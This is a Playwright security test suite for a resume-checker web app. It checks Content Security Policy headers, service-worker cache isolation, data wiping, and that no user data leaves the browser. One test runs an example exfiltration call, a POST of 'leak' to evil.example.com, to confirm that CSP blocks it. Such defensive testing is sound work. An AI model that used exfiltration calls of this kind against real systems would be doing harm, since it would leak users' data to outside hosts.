import { test, expect } from '@playwright/test';
import { spawn, type ChildProcess } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const CANONICAL_META_CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "worker-src 'self' blob:",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ') + ';';

const CANONICAL_HEADER_CSP = `${CANONICAL_META_CSP.slice(0, -1)}; frame-ancestors 'none';`;

const PREVIEW_PORT = 4175;
const PREVIEW_URL = `http://localhost:${PREVIEW_PORT}`;
const ROOT = process.cwd();

let previewProc: ChildProcess | null = null;
let previewStdout = '';
let previewStderr = '';

async function waitForServer(url: string, timeoutMs = 20_000): Promise<void> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const res = await fetch(url);
      if (res.ok) return;
    } catch {
      // retry until server listens
    }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error(`Preview server at ${url} did not become ready within ${timeoutMs}ms.\nSTDOUT:\n${previewStdout}\nSTDERR:\n${previewStderr}`);
}

async function dismissLoaderIfVisible(page: import('@playwright/test').Page): Promise<void> {
  const skipBtn = page.locator('button[aria-label="Skip intro animation"]');
  if (await skipBtn.isVisible().catch(() => false)) {
    await skipBtn.click().catch(() => {});
  }
  await page.waitForTimeout(450);
}

test.describe('Phase 10.7 Workstream C: Live Production Build (dist/) Security & Privacy Runtime', () => {
  test.beforeAll(async () => {
    const viteBin = path.join(ROOT, 'node_modules', 'vite', 'bin', 'vite.js');
    previewProc = spawn(
      process.execPath,
      [viteBin, 'preview', '--host', 'localhost', '--port', String(PREVIEW_PORT), '--strictPort'],
      {
        cwd: ROOT,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env },
      }
    );
    previewProc.stdout?.on('data', (chunk) => {
      previewStdout += String(chunk);
    });
    previewProc.stderr?.on('data', (chunk) => {
      previewStderr += String(chunk);
    });
    await waitForServer(PREVIEW_URL);
  });

  test.afterAll(async () => {
    if (previewProc && !previewProc.killed) {
      previewProc.kill('SIGTERM');
      await new Promise((r) => setTimeout(r, 300));
      if (!previewProc.killed && previewProc.pid && process.platform === 'win32') {
        spawn('taskkill', ['/pid', String(previewProc.pid), '/T', '/F'], { stdio: 'ignore' });
      }
    }
  });

  test('C1a: enforces production CSP headers, theme-init.js, and zero CSP violations on initial render', async ({ page }) => {
    const cspViolations: Array<{ effectiveDirective: string; blockedURI: string; violatedDirective: string }> = [];
    const pageErrors: string[] = [];
    const failedRequests: Array<{ url: string; failure: string | null }> = [];

    await page.addInitScript(() => {
      (window as any).__cspEvents = [];
      document.addEventListener('securitypolicyviolation', (e) => {
        (window as any).__cspEvents.push({
          effectiveDirective: e.effectiveDirective,
          violatedDirective: e.violatedDirective,
          blockedURI: e.blockedURI,
          sourceFile: e.sourceFile,
          lineNumber: e.lineNumber,
          sample: e.sample,
        });
      });
    });

    page.on('pageerror', (err) => pageErrors.push(err.message));
    page.on('requestfailed', (req) => {
      failedRequests.push({ url: req.url(), failure: req.failure()?.errorText || null });
    });
    page.on('console', (msg) => {
      if (msg.type() === 'error' && msg.text().toLowerCase().includes('content security policy')) {
        cspViolations.push({ effectiveDirective: 'console', blockedURI: msg.text(), violatedDirective: 'console' });
      }
    });

    const response = await page.goto(`${PREVIEW_URL}/tools/resume-checker`, { waitUntil: 'networkidle' });
    expect(response).not.toBeNull();
    expect(response!.status()).toBe(200);

    // 1. Verify preview HTTP security headers match canonical CSP
    const headers = response!.headers();
    expect(headers['content-security-policy']).toBe(CANONICAL_HEADER_CSP);
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['x-frame-options']).toBe('DENY');
    expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    expect(headers['permissions-policy']).toContain('camera=()');

    // 2. Verify /theme-init.js served cleanly & applied DOM attributes
    const themeRes = await page.request.get(`${PREVIEW_URL}/theme-init.js`);
    expect(themeRes.status()).toBe(200);

    const domCspAndTheme = await page.evaluate(() => {
      const metas = Array.from(document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]'));
      const inlineScripts = Array.from(document.querySelectorAll('script')).filter(
        (s) => !s.src && s.textContent && s.textContent.trim().length > 0
      );
      return {
        metaCount: metas.length,
        metaContent: metas[0]?.getAttribute('content') || '',
        inlineScriptsCount: inlineScripts.length,
        dataDesign: document.documentElement.getAttribute('data-design'),
        dataTheme: document.documentElement.getAttribute('data-theme'),
        colorScheme: document.documentElement.style.colorScheme,
        cspEventsBeforeProbe: (window as any).__cspEvents || [],
      };
    });

    expect(domCspAndTheme.metaCount).toBe(1);
    expect(domCspAndTheme.metaContent).toBe(CANONICAL_META_CSP);
    expect(domCspAndTheme.inlineScriptsCount).toBe(0);
    expect(domCspAndTheme.dataDesign).toBe('neon-volt');
    expect(domCspAndTheme.dataTheme).toBe('dark');
    expect(domCspAndTheme.colorScheme).toBe('dark');
    expect(domCspAndTheme.cspEventsBeforeProbe).toEqual([]);

    // Verify spruce + light theme init works across reload
    await page.evaluate(() => {
      localStorage.setItem('hireflow:v4:design', 'spruce');
      localStorage.setItem('hireflow:v4:theme-mode', 'light');
    });
    await page.reload({ waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);
    const spruceTheme = await page.evaluate(() => ({
      dataDesign: document.documentElement.getAttribute('data-design'),
      dataTheme: document.documentElement.getAttribute('data-theme'),
      colorScheme: document.documentElement.style.colorScheme,
      cspEvents: (window as any).__cspEvents || [],
    }));
    expect(spruceTheme.dataDesign).toBe('spruce');
    expect(spruceTheme.dataTheme).toBe('light');
    expect(spruceTheme.colorScheme).toBe('light');
    expect(spruceTheme.cspEvents).toEqual([]);
    expect(cspViolations).toEqual([]);
    expect(pageErrors).toEqual([]);
    expect(failedRequests).toEqual([]);
  });

  test('C1b: actively blocks injected inline <script> and disallowed external fetch under Chromium CSP', async ({ page }) => {
    await page.addInitScript(() => {
      (window as any).__cspEvents = [];
      document.addEventListener('securitypolicyviolation', (e) => {
        (window as any).__cspEvents.push({
          effectiveDirective: e.effectiveDirective,
          violatedDirective: e.violatedDirective,
          blockedURI: e.blockedURI,
        });
      });
    });

    await page.goto(`${PREVIEW_URL}/tools/resume-checker`, { waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    const probeResult = await page.evaluate(async () => {
      (window as any).__cspEvents = [];

      const s = document.createElement('script');
      s.textContent = 'window.__cspInlineRan107 = true;';
      document.head.appendChild(s);

      let fetchBlocked = false;
      try {
        await fetch('https://evil.example.com/telemetry', { method: 'POST', body: 'leak' });
      } catch {
        fetchBlocked = true;
      }

      await new Promise((r) => setTimeout(r, 100));
      return {
        inlineRan: Boolean((window as any).__cspInlineRan107),
        fetchBlocked,
        events: (window as any).__cspEvents as Array<{ effectiveDirective: string; blockedURI: string }>,
      };
    });

    expect(probeResult.inlineRan).toBe(false);
    expect(probeResult.fetchBlocked).toBe(true);
    expect(probeResult.events.some((e) => e.effectiveDirective.includes('script-src') && e.blockedURI === 'inline')).toBe(true);
    expect(probeResult.events.some((e) => e.effectiveDirective.includes('connect-src'))).toBe(true);
  });

  test('C2: monitors EVERY network request across Guest -> Upload Sentinel -> Scan -> History -> PDF/DOCX Export -> Wipe -> Fresh Session', async ({ page }) => {
    const RESUME_SENTINEL = 'UNIQUE_CANDIDATE_SENTINEL_107';
    const JD_SENTINEL = 'UNIQUE_JD_SENTINEL_107';

    const capturedRequests: Array<{ method: string; url: string; resourceType: string; hasPostBody: boolean; bodySnippet: string }> = [];
    const wsConnections: string[] = [];

    page.on('request', (req) => {
      const postData = req.postData() || '';
      capturedRequests.push({
        method: req.method(),
        url: req.url(),
        resourceType: req.resourceType(),
        hasPostBody: postData.length > 0,
        bodySnippet: postData.slice(0, 120),
      });
    });
    page.on('websocket', (ws) => wsConnections.push(ws.url()));

    // 1. Guest session on Resume Checker
    await page.goto(`${PREVIEW_URL}/tools/resume-checker`, { waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    // 2. Upload .txt resume containing sentinel string
    const resumePayload = `${RESUME_SENTINEL}
Email: sentinel107@example.com | Phone: +91-9988776655
SUMMARY
Senior Software Engineer with 4 years of production TypeScript, React, Node.js, and PostgreSQL experience.
EXPERIENCE
Software Engineer | ScaleLabs
Jan 2022 - Oct 2025
- Architected TypeScript microservices handling 10k req/s and reduced p95 latency by 40%.
- Built PostgreSQL indexing strategies reducing query load by 35% across 12 services.
TECHNICAL SKILLS
TypeScript, React, Node.js, PostgreSQL, Docker, Kubernetes, Jest
EDUCATION
B.Tech Computer Science, 2021
PROJECTS
Distributed Task Queue - Built resilient worker queue with Redis and TypeScript.`;

    await page.locator('input[type="file"]').nth(0).setInputFiles({
      name: 'sentinel_resume_107.txt',
      mimeType: 'text/plain',
      buffer: Buffer.from(resumePayload, 'utf-8'),
    });

    await expect(page.getByText('sentinel_resume_107.txt').first()).toBeVisible({ timeout: 10_000 });

    // 3. Enter JD containing JD sentinel & run scan analysis
    const jdPayload = `Role: Senior Full-Stack Engineer (${JD_SENTINEL})
Company: CloudScale Corp
Experience: 3+ Years
Must-Have Requirements:
- Strong proficiency in TypeScript, React, Node.js, and PostgreSQL.
- Production experience with Docker and REST APIs.
Responsibilities:
- Design scalable backend APIs and frontend workflows.`;

    const jdTextarea = page.locator('textarea').last();
    await jdTextarea.fill(jdPayload);

    const analyzeBtn = page.getByRole('button', { name: /Roast & Analyze Match/i });
    await expect(analyzeBtn).toBeEnabled();
    await analyzeBtn.click();

    const confirmBtn = page.getByRole('button', { name: /Confirm & Run Simulation/i });
    await expect(confirmBtn).toBeVisible({ timeout: 5000 });
    await confirmBtn.click();

    // Wait for results screen
    const downloadReportBtn = page.getByRole('button', { name: /Download ATS Roast Report/i }).first();
    await expect(downloadReportBtn).toBeVisible({ timeout: 15_000 });

    // 4. Export PDF and DOCX locally
    const [pdfDownload] = await Promise.all([
      page.waitForEvent('download'),
      downloadReportBtn.click(),
    ]);
    const pdfPath = await pdfDownload.path();
    expect(pdfPath).toBeTruthy();
    expect(pdfDownload.suggestedFilename()).toMatch(/\.pdf$/i);
    const pdfBytes = fs.readFileSync(pdfPath!);
    expect(pdfBytes.subarray(0, 5).toString('ascii')).toBe('%PDF-');

    const formatMenuBtn = page.getByRole('button', { name: /Choose report download format/i }).first();
    await formatMenuBtn.click();
    const [docxDownload] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: /Word Document/i }).click(),
    ]);
    const docxPath = await docxDownload.path();
    expect(docxPath).toBeTruthy();
    expect(docxDownload.suggestedFilename()).toMatch(/\.docx$/i);
    const docxBytes = fs.readFileSync(docxPath!);
    expect(docxBytes.subarray(0, 2).toString('ascii')).toBe('PK');

    // 5. History view
    await page.goto(`${PREVIEW_URL}/history`, { waitUntil: 'networkidle' });
    await expect(page.getByRole('heading', { name: /Scan History & Progression/i })).toBeVisible();

    // 6. Navigate to /data -> Erase all data (simulated logout/wipe) -> Fresh session
    await page.goto(`${PREVIEW_URL}/data`, { waitUntil: 'networkidle' });
    await page.getByRole('button', { name: /Erase All Data/i }).click();
    await page.locator('#confirm-typed-input').fill('CLEAR');
    await page.getByRole('button', { name: /Erase Everything/i }).click();
    await page.waitForTimeout(300);

    await page.reload({ waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    const postWipeStorage = await page.evaluate((sentinel) => {
      const lsMatches: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i)!;
        const v = localStorage.getItem(k) || '';
        if (v.includes(sentinel)) lsMatches.push(k);
      }
      return { lsMatches, sessionLen: sessionStorage.length };
    }, RESUME_SENTINEL);
    expect(postWipeStorage.lsMatches).toEqual([]);

    // Assert zero outbound external network egress & zero sentinel leakage in any request
    expect(wsConnections).toEqual([]);
    const disallowedRequests = capturedRequests.filter((r) => {
      if (r.url.startsWith('blob:') || r.url.startsWith('data:')) return false;
      const u = new URL(r.url);
      return u.origin !== PREVIEW_URL;
    });
    expect(disallowedRequests).toEqual([]);

    const sentinelLeaks = capturedRequests.filter(
      (r) =>
        r.url.includes(RESUME_SENTINEL) ||
        r.url.includes(JD_SENTINEL) ||
        r.bodySnippet.includes(RESUME_SENTINEL) ||
        r.bodySnippet.includes(JD_SENTINEL)
    );
    expect(sentinelLeaks).toEqual([]);

    // Log unique request destinations cleanly for audit output
    const uniqueDestinations = Array.from(new Set(capturedRequests.map((r) => `${r.method} ${new URL(r.url).origin}${new URL(r.url).pathname}`)));
    console.log('[C2 Network Destinations]:', JSON.stringify(uniqueDestinations));
  });

  test('C3: inspects live Chromium Service Worker registration, CacheStorage isolation, CLEAR_USER_CACHES & credentials: include', async ({ page }) => {
    const distSwText = fs.readFileSync(path.join(ROOT, 'dist', 'sw.js'), 'utf-8');
    const versionMatch = distSwText.match(/const\s+CACHE_VERSION\s*=\s*'([^']+)'/);
    expect(versionMatch).not.toBeNull();
    const expectedCacheVersion = versionMatch![1];
    const expectedShellCache = `${expectedCacheVersion}-shell`;
    const expectedRuntimeCache = `${expectedCacheVersion}-runtime`;

    const jsAsset = fs
      .readdirSync(path.join(ROOT, 'dist', 'assets'))
      .find((f) => f.endsWith('.js') && !f.includes('index'));
    expect(jsAsset).toBeTruthy();
    const staticAssetPath = `/assets/${jsAsset}`;

    await page.goto(`${PREVIEW_URL}/`, { waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    // Wait for SW registration and reload so SW controls this page
    await page.evaluate(async () => {
      await navigator.serviceWorker.ready;
    });
    await page.reload({ waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    const controlled = await page.evaluate(() => Boolean(navigator.serviceWorker.controller));
    expect(controlled).toBe(true);

    // Trigger sensitive paths + HTML navigation + normal static asset
    await page.evaluate(async (assetPath) => {
      await fetch('/api/ats/analyze').catch(() => {});
      await fetch('/auth/callback').catch(() => {});
      await fetch('/user-data.json').catch(() => {});
      await fetch(assetPath).catch(() => {});
    }, staticAssetPath);
    await page.waitForTimeout(400);

    const cacheDumpBeforeClear = await page.evaluate(async () => {
      const names = await caches.keys();
      const dump: Record<string, string[]> = {};
      for (const name of names) {
        const c = await caches.open(name);
        const reqs = await c.keys();
        dump[name] = reqs.map((r) => new URL(r.url).pathname);
      }
      return dump;
    });
    console.log('[C3 CacheStorage Dump Before Clear]:', JSON.stringify(cacheDumpBeforeClear));

    expect(Object.keys(cacheDumpBeforeClear)).toContain(expectedShellCache);
    const runtimePaths = cacheDumpBeforeClear[expectedRuntimeCache] || [];
    expect(runtimePaths).not.toContain('/api/ats/analyze');
    expect(runtimePaths).not.toContain('/auth/callback');
    expect(runtimePaths).not.toContain('/user-data.json');
    expect(runtimePaths.some((p) => p === '/' || p.endsWith('.html'))).toBe(false);
    expect(runtimePaths).toContain(staticAssetPath);

    // Send CLEAR_USER_CACHES to active SW controller
    await page.evaluate(async () => {
      navigator.serviceWorker.controller?.postMessage({ type: 'CLEAR_USER_CACHES' });
    });
    await page.waitForTimeout(400);

    const keysAfterClear = await page.evaluate(() => caches.keys());
    expect(keysAfterClear).toContain(expectedShellCache);
    expect(keysAfterClear).not.toContain(expectedRuntimeCache);

    // CRITICAL C3 CHECK: fetch with credentials: 'include' MUST NEVER populate RUNTIME_CACHE
    await page.evaluate(async (assetPath) => {
      await fetch(assetPath, { credentials: 'include' });
    }, staticAssetPath);
    await page.waitForTimeout(400);

    const runtimeAfterCredentialedFetch = await page.evaluate(async (runtimeName) => {
      const exists = (await caches.keys()).includes(runtimeName);
      if (!exists) return [];
      const c = await caches.open(runtimeName);
      const reqs = await c.keys();
      return reqs.map((r) => new URL(r.url).pathname);
    }, expectedRuntimeCache);

    expect(runtimeAfterCredentialedFetch).not.toContain(staticAssetPath);
  });

  test('C5-C6: verifies honest Cloud-First disclosures, JSON session export & legacy importer readiness in /data', async ({ page }) => {
    await page.goto(`${PREVIEW_URL}/data`, { waitUntil: 'networkidle' });
    await dismissLoaderIfVisible(page);

    const pageText = await page.locator('body').innerText();
    expect(pageText).toMatch(/Supabase RLS|Transient In-Memory/i);
    expect(pageText).not.toMatch(/\b(?:localStorage|IndexedDB|backups?)\s+(?:is|are)\s+encrypted\b/i);
    expect(pageText).not.toMatch(/\bencrypted\s+at\s+rest\b/i);

    // Export current session JSON via UI button
    const [sessionDownload] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: /Export Session JSON/i }).click(),
    ]);
    const downloadPath = await sessionDownload.path();
    expect(downloadPath).toBeTruthy();

    const rawExport = fs.readFileSync(downloadPath!, 'utf-8');
    const parsedExport = JSON.parse(rawExport);
    expect(parsedExport.exportedAt).toBeTruthy();
    expect(parsedExport.account).toBeDefined();
  });
});
